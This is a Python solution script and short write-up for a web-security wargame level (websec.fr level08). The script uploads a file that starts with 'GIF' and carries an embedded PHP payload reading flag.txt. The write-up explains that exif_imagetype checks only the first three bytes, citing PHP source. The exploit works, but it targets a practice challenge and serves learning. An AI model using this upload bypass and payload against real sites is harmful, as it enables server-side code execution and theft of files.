from requests import *

url = "https://websec.fr/level08/index.php"

filename = 'skibidi.gif'
gif_magic = b'GIF'
payload = b'<?php echo file_get_contents("flag.txt") ?>'

with open(filename, "wb") as f:
    f.write(gif_magic + payload)

with open(filename, "rb") as f:
    files = { "fileToUpload" : (filename, f, "image/gif") }
    data = { "submit": "Upload Image" }

    r = post(url, files=files, data=data).text

s = r.find("WEBSEC")
e = r.find("}", s) + 1
print(r[s:e])


"""
it was pretty obvious that the problem relies in exif_imagetype function, after short
examination it seems that it checks the file type only by looking at the magic, so we can
put the gif's magic at the beginning of the file and then write php code, when the file be
passed to include_once , the embeded php code will be detected and run


COOL THING -
at the beginning i just googled exif_imagetype to see if it has some quirks,
and i did found out the trick above, but implemented it poorly (i wrote gif magic as `GIF87`
instead of `GIF87a` and it still worked! so I even went further and tried `GIF6767` and it
worked aswell, But when I changed one of the firstr 3 bytes, it failed, so they are not even
checking trhe whole magic but just the first 3 bytes.
We can also see it in the source here (since it also worked on my built php8 I looked at this sources):
entry point is ext/exif/exif.c:4971 - `PHP_FUNCTION(exif_imagetype)` and the actual parsing happens
at ext/standard/image.c:1365 - `php_getimagetype`:


/* {{{ php_imagetype
   detect filetype from first bytes */
PHPAPI int php_getimagetype(php_stream *stream, const char *input, char *filetype)
{
	char tmp[12];
	int twelve_bytes_read;

	if ( !filetype) filetype = tmp;
	if((php_stream_read(stream, filetype, 3)) != 3) {
		php_error_docref(NULL, E_NOTICE, "Error reading from %s!", input);
		return IMAGE_FILETYPE_UNKNOWN;
	}

/* BYTES READ: 3 */
	if (!memcmp(filetype, php_sig_gif, 3)) {
		return IMAGE_FILETYPE_GIF;

...
}


So the function determines the file type by reading the first 3 bytes of the file from the stream to
`filetype` and then just compares it to many file types. So, back to our chellenge, as long as the first
3 bytes of the file are `GIF`, we are bypassing the check.


"""
